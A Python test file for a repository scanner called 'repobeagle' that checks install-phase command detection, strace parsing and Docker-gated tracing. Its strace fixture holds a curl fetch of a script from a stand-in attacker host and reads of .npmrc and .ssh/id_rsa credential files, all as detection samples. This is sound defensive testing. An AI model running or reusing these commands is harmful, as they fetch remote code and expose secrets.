"""`--trace`: install-phase detection, strace parsing, capability verification (Docker-gated integration)."""
import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
import repobeagle as rb

TRACE = """
1111 connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = 0
1112 connect(4, {sa_family=AF_INET6, sin6_port=htons(443), inet_pton(AF_INET6, "2606:4700::1111", &sin6_addr)}, 16) = 0
1113 connect(5, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
1114 execve("/usr/bin/curl", ["curl", "-fsSL", "https://evil.example.invalid/x.sh"], 0x0) = 0
1115 execve("/usr/bin/node", ["node", "scripts/setup.js"], 0x0) = 0
1116 openat(AT_FDCWD, "/tmp/.npmrc", O_RDONLY|O_CLOEXEC) = 3
1117 openat(AT_FDCWD, "/tmp/.ssh/id_rsa", O_RDONLY) = 3
1118 openat(AT_FDCWD, "/usr/lib/python3.12/os.py", O_RDONLY) = 3
"""


def test_install_commands():
    cmds = rb.detect_install_commands(ROOT / "tests/fixtures/trap-npm")
    assert [c[0] for c in cmds] == ["npm postinstall"], cmds
    assert "curl" in cmds[0][1] and "node" in cmds[0][1]
    clean = rb.detect_install_commands(ROOT / "tests/fixtures/control-clean")
    assert any(label == "python install" and "--no-index" in command for label, command in clean), clean
    with tempfile.TemporaryDirectory() as td:
        Path(td, "package.json").write_text('{"name": "x", "scripts": {"test": "echo"}}', encoding="utf-8")
        assert rb.detect_install_commands(td) == [], "only tests/builds must not be run"
        Path(td, "setup.py").write_text("from setuptools import setup\nsetup()\n", encoding="utf-8")
        cmds = rb.detect_install_commands(td)
        assert cmds and cmds[0][0] == "python install" and "--no-build-isolation" in cmds[0][1], cmds
    print("PASS install-phase detection (npm lifecycle only, Python install offline)")


def test_parse_and_verify():
    evidence, stats = rb.parse_strace(TRACE, ROOT / "tests/fixtures/trap-npm")
    assert stats["connect"] == 3 and stats["execve"] == 2 and stats["openat"] == 3, stats
    assert "evil.example.invalid" in evidence["network"], evidence
    assert "93.184.216.34" in evidence["network"] and "2606:4700::1111" in evidence["network"], evidence
    assert "127.0.0.1" not in evidence["network"], "loopback must not count as a host"
    assert evidence["processes"] == ["curl", "node"], evidence
    assert ".npmrc" in evidence["filesystem"] and ".ssh" in evidence["filesystem"], evidence
    caps = rb.scan_capabilities(ROOT / "tests/fixtures/trap-npm", trace=evidence)
    net = {e["value"]: e for e in caps["network"]}
    assert net["evil.example.invalid"]["verified"] is True and net["evil.example.invalid"]["source"] == "trace", net
    procs = {e["value"] for e in caps["processes"]}
    assert {"curl", "node"} <= procs, procs
    print("PASS strace parsing and trace-verified capabilities (loopback excluded)")


def test_cli_trace_when_image_present():
    image = rb.IMAGE
    have = subprocess.run(["docker", "image", "inspect", image], capture_output=True, text=True)
    if have.returncode != 0:
        print(f"SKIP --trace integration: {image} not present locally")
        return
    cache = tempfile.mkdtemp()
    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as fh:
        out = Path(fh.name)
    try:
        r = subprocess.run([sys.executable, "repobeagle.py", "scan", "tests/fixtures/trap-npm", "--trace",
                            "--trace-timeout", "120", "--no-osv", "--no-trust", "--no-cache", "--no-color",
                            "--json", str(out)], cwd=ROOT, capture_output=True, text=True, timeout=900,
                           env=dict(os.environ, XDG_CACHE_HOME=cache))
        d = json.loads(out.read_text(encoding="utf-8"))
        assert d["meta"]["trace"]["commands"], d["meta"].get("trace")
        assert d["meta"]["trace"]["syscalls"]["execve"] >= 1, d["meta"]["trace"]
        trace_net = {e["value"] for e in d["meta"]["capabilities"]["network"] if e.get("source") == "trace"}
        assert "evil.example.invalid" in trace_net, trace_net
        assert any(f["title"].startswith("trace-verified") for f in d["findings"]), [f["title"] for f in d["findings"]]
        clean = subprocess.run([sys.executable, "repobeagle.py", "scan", "tests/fixtures/control-clean", "--trace",
                                 "--trace-timeout", "120", "--no-osv", "--no-trust", "--no-cache", "--no-color",
                                 "--json", str(out)], cwd=ROOT, capture_output=True, text=True, timeout=900,
                                env=dict(os.environ, XDG_CACHE_HOME=cache))
        d2 = json.loads(out.read_text(encoding="utf-8"))
        assert d2["meta"]["trace"]["syscalls"]["connect"] == 0, d2["meta"]["trace"]
        assert not [e for e in d2["meta"]["capabilities"]["network"] if e.get("source") == "trace"], \
            d2["meta"]["capabilities"]["network"]
    finally:
        out.unlink(missing_ok=True)
    print("PASS --trace records the postinstall host + node subprocess and no connect for control-clean")


if __name__ == "__main__":
    test_install_commands()
    test_parse_and_verify()
    test_cli_trace_when_image_present()
    print("trace tests passed")
